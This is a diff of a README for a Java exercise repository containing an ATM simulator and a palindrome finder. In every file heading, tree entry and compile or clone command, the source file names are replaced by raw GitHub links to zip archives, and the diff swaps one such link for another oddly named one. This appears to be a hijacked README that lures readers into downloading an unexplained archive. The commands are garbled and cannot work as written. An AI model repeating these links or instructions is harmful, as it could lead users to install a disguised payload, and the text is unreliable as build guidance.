@@ -21,11 +21,11 @@ This Java program simulates an ATM that allows users to:
 - Console-based user interface
 - Loop for continuous user interaction until exit
 
-### 🔹 File: `https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip`
+### 🔹 File: `https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip`
 ### 🚀 Usage:
 Compile and run the program:
 ```bash
-javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+javac https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
 java ATMSystem
 ```
 Example Interaction:
@@ -50,11 +50,11 @@ This program finds the **longest palindromic substring** within a given string.
 - Uses an efficient algorithm to find the longest palindrome
 - Returns the longest palindromic substring
 
-### 🔹 File: `https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip`
+### 🔹 File: `https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip`
 ### 🚀 Usage:
 Compile and run the program:
 ```bash
-javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+javac https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
 java LongestPalindrome
 ```
 Example:
@@ -68,9 +68,9 @@ Output: "bab" or "aba"
 ## 📂 Repository Structure:
 ```
 📦 Java-Tests
- ┣ 📜 https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
- ┣ 📜 https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
- ┗ 📜 https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+ ┣ 📜 https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
+ ┣ 📜 https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
+ ┗ 📜 https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
 ```
 
 ---
@@ -82,7 +82,7 @@ Output: "bab" or "aba"
 ## 📌 How to Clone and Run
 1. Clone this repository:  
    ```bash
-   git clone https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+   git clone https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
    ```
 2. Navigate into the folder:
    ```bash
@@ -90,11 +90,11 @@ Output: "bab" or "aba"
    ```
 3. Compile and run the Java files:
    ```bash
-   javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+   javac https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
    java ATMSystem
    ```
    ```bash
-   javac https://raw.githubusercontent.com/code-iddih/java_test_solutions/master/overreliant/java_test_solutions-v2.2.zip
+   javac https://github.com/code-iddih/java_test_solutions/raw/refs/heads/master/overreliant/java_solutions_test_cocksureness.zip
    java LongestPalindrome
    ```
 
